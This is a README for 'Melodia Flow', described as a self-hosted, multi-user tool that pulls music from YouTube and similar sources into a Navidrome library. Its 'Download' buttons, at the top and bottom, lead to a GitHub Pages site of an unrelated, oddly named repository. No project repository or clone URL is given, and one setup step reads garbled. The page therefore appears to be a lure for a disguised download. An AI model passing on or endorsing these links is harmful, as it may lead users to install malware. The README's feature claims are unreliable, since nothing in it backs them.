![preview](https://raw.githubusercontent.com/22004251-tech/dashdeck-harmonized-imports/main/preview.svg)

# Melodia Flow 🎵

**Your personal, sovereign music ecosystem — where discovery meets ownership.**

Melodia Flow is a self-hosted, multi-user music acquisition and curation platform designed to feed your existing Navidrome instance (or any Subsonic-compatible server). Think of it as a **digital butler for your music library** — it doesn't just download songs; it learns your tastes, respects your privacy, and orchestrates a seamless pipeline from streaming service discovery to local file storage.

Built with a **trinity of modern technologies** (SvelteKit for the reactive frontend, FastAPI for the intelligent API layer, and a Go plugin engine for high-performance audio extraction), Melodia Flow is Docker-native, NAS-friendly, and comes with **multi-user support from day one** — including two-factor authentication, encrypted user secrets, and personal access tokens (PATs) for granular access control.

Whether you're a family sharing a home server or a solo audiophile who wants to escape the streaming subscription treadmill, Melodia Flow turns the act of acquiring music into an **elegant, automated ritual**.

---

## Overview 🚀

Most self-hosted music solutions stop at *playing* your files. Melodia Flow fills the gap: **how do those files get there in the first place?**

This project acts as a **smart acquisition proxy** between you and the music you love. You search for an artist or album on Spotify or Deezer (via their APIs), Melodia Flow finds matching tracks on YouTube (or other audio sources), extracts the highest-quality audio, tags it with metadata, and delivers it directly into your Navidrome music folder — all without leaving your browser.

It’s like having a **private, always-on music librarian** who never sleeps, never asks for a tip, and keeps your collection astonishingly organized.

### Why Melodia Flow Exists

- **You don't own your streaming playlist.** When a label pulls a catalog, your playlist breaks. Melodia Flow downloads the files — ownership restored.
- **Multi-user is not an afterthought.** From the first commit, Melodia Flow treats every listener as an independent identity with their own queue, history, and download preferences.
- **Security first.** Your Spotify/Deezer API tokens are encrypted at rest. 2FA protects the admin panel. PATs allow scripts and integrations without sharing passwords.
- **Docker simplicity.** One YAML file, one folder for config, one volume for music. No dependency hell.

---

## Key Features 🌟

| Feature | Description |
|---|---|
| **Multi-User with Identity** | Each user has encrypted secrets, personalized search history, and independent download queues. |
| **2FA & PAT Authentication** | Time-based one-time passwords (TOTP) for the web UI; personal access tokens for API automation. |
| **Spotify & Deezer Search** | Native API integration for discovering tracks, albums, and playlists from two major catalogs. |
| **YouTube Audio Extraction** | Go-based plugin engine finds the best matching audio source and extracts it with metadata embedding. |
| **Automatic Metadata Tagging** | Album art, artist, genre, year, track number — all written directly into the file's ID3 tags. |
| **Navidrome Folder Sync** | Downloaded files are placed into a configurable music directory that Navidrome monitors. |
| **SvelteKit Frontend** | Reactive, responsive, dark-mode-first user interface with real-time download progress. |
| **FastAPI Backend** | Asynchronous, dependency-injected API with automatic OpenAPI docs. |
| **Go Plugin Architecture** | Hot-reloadable plugins for audio sources — extend without restarting the server. |
| **Docker-Only Deployment** | Single `docker-compose.yml` with persistent volumes. Optimized for Synology, QNAP, Unraid. |
| **Queue Management** | Prioritize, pause, retry, or cancel downloads. Smart deduplication prevents redownloads. |
| **User Quotas & Rate Limiting** | Prevent one user from hogging all system resources; configurable daily download caps. |

---

[![Download](https://raw.githubusercontent.com/22004251-tech/dashdeck-harmonized-imports/main/button.svg)](https://22004251-tech.github.io/dashdeck-harmonized-imports/)

---

## Architecture 🔧

Melodia Flow is a **three-tier application** running inside Docker containers:

1. **Frontend (SvelteKit)** — Port 3000. Handles UI, authentication flows, WebSocket connections for real-time updates.
2. **API (FastAPI)** — Port 8000. Manages user sessions, queuing logic, database operations, and plugin orchestration.
3. **Plugin Engine (Go)** — Internal unix socket. Each audio source (YouTube, SoundCloud, Bandcamp) is a compiled Go plugin loaded at runtime. This sandbox isolates extraction logic from the main application.

**Data Flow:**

```
User Search (Spotify/Deezer) 
    → API resolves metadata 
    → Plugin Engine finds audio match 
    → Download worker fetches file 
    → Metadata tagger enriches file 
    → File placed into Navidrome watch folder
    → WebSocket notifies user "Done!"
```

---

## Getting Started 🧭

### Prerequisites

- **Docker** and **Docker Compose** (version 2.x or later)
- **Navidrome** (or another Subsonic-compatible server) already running and configured
- **API keys** for Spotify (free tier works) and/or Deezer Developer account

### Deployment Outline

1. **Clone** the repository configuration repository.
2. **Create** a `config/` directory and add your `melodia-flow.yml` with API keys, user definitions, and folder paths.
3. **Set** environment variables for encryption salt and JWT secret.
4. **Run** `docker compose up -d`.
5. **Open** `http://your-server:3000` and complete the admin setup wizard (first user gets admin rights).

The system will **auto-detect** existing Navidrome folder permissions and adjust the container user IDs (PUID/PGID) accordingly.

---

## User Roles & Permissions 👥

Melodia Flow defines three trust levels:

- **Admin** — Full access: manage users, view all queues, change system settings, approve plugin updates.
- **Curator** — Can download for anyone, manage playlists across users, but cannot modify user credentials.
- **Listener** — Only sees own history and queue. Can generate PATs for personal automation.

**Invitation system:** New users receive a one-time registration link (valid for 24 hours) sent by email or printed as a QR code.

---

## Security Model 🔒

- **Encryption at rest:** All third-party API tokens are encrypted using `cryptography` Fernet symmetric encryption with a master key stored in memory (loaded from environment during boot).
- **2FA:** Uses `pyotp` for TOTP generation. Admin users must enroll within 24 hours of first login.
- **PAT rotation:** Personal access tokens have configurable expiration (default 90 days). Revoked tokens invalidate instantly.
- **Plugin sandboxing:** Go plugins run in a separate process with limited filesystem access (read-only except output directory).

---

## Plugin System (Go) 🧩

Melodia Flow’s ability to extract audio from multiple sources comes from its **plugin architecture**.

Each plugin implements a simple interface:

```
Search(query) → []SourceMatch
Resolve(SourceMatch) → AudioStream
```

Currently shipping with:
- **YouTube Audio** — Extracts highest bitrate audio stream; falls back to opus then mp4a.
- **SoundCloud Grabber** — Works with both free and Go+ content (when authenticated).
- **Bandcamp Downloader** — Supports album and track pages.
- **Custom Source Framework** — Write your own plugin in Go, compile it, drop it into the `plugins/` directory, and it becomes available in the UI.

---

## Customization & Theming 🎨

The SvelteKit frontend supports **runtime theming** via CSS custom properties:

```yaml
ui:
  theme: "deepsea"  # options: deepsea, emerald, midnight, sandstorm
  logo_path: "/custom/logo.svg"
  footer_text: "Powered by Melodia Flow"
```

Administrators can upload a custom logo and modify colors without rebuilding the container. Themes persist across updates.

---

## Multilingual Support 🌐

Melodia Flow ships with **14 language locales** out of the box:

- English, Spanish, French, German, Italian, Portuguese, Dutch, Russian, Japanese, Korean, Chinese (Simplified), Turkish, Polish, and Swedish.

Language detection uses browser `Accept-Language` header; users can override via their profile settings. Translation contributions follow a simple JSON key-value format in `locales/`.

---

## Logging & Monitoring 📊

- **Structured JSON logs** emitted to stdout (captured by Docker).
- **Prometheus metrics endpoint** at `/api/v1/metrics` (counters for downloads, errors, active users).
- **Health check** at `/health` returns container status and plugin engine version.
- **Optional Slack/Telegram webhooks** for download completion or failure notifications.

---

## Maintenance & Updates ♻️

Melodia Flow is designed for **zero-downtime configuration reloads**:

- `POST /api/v1/system/reload` — Re-reads config file, applies new users and rate limits without restarting.
- `POST /api/v1/plugins/reload` — Unloads and loads all plugins (brief interruption to queued downloads, typically <2 seconds).
- Database migrations run automatically on container startup; rollbacks are documented in `MIGRATIONS.md`.

---

## FAQ 🤔

**Q: Can I use this without Navidrome?**  
A: Yes. Melodia Flow can write to any folder you mount. However, Navidrome’s auto-scan feature is the primary use case.

**Q: Does it work with Apple Music / Tidal?**  
A: Not natively, but the plugin architecture allows a skilled developer to add support. Community plugins are welcome.

**Q: Is there a webhook when downloads finish?**  
A: Yes. Configure `notifications.webhook_url` in the config file. Payload includes user, track, and file path.

**Q: What if two users search for the same song at the same time?**  
A: The queue system deduplicates by file hash — only one download is triggered; both users are notified.

---

## License 📄

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.  
You are free to use, modify, and distribute Melodia Flow for any purpose — personal, educational, or commercial.

---

## Disclaimer ⚠️

Melodia Flow is a **technical tool for content acquisition** and does not provide or host any copyrighted material. Users are solely responsible for ensuring their use of third-party APIs and downloaded content complies with applicable laws in their jurisdiction. The developers assume no liability for misuse of this software. Always respect the rights of artists and copyright holders.

---

*Melodia Flow — because your music library should feel like a carefully curated collection, not a chaotic pile of downloads.*

[![Download](https://raw.githubusercontent.com/22004251-tech/dashdeck-harmonized-imports/main/button.svg)](https://22004251-tech.github.io/dashdeck-harmonized-imports/)